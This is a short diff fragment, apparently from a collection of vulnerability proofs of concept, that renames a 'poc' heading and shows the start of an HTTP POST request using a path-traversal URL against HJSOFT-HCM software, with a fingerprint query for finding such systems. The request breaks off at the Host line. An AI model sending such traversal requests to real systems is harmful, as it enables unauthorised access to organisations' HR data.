@@ -5,7 +5,7 @@
 app="HJSOFT-HCM"
 ```
 
-## poc
+## POC
 ```
 POST /templates/attestation/../../report/report_collect/report_org_collect_tree.jsp HTTP/1.1
 Host: 
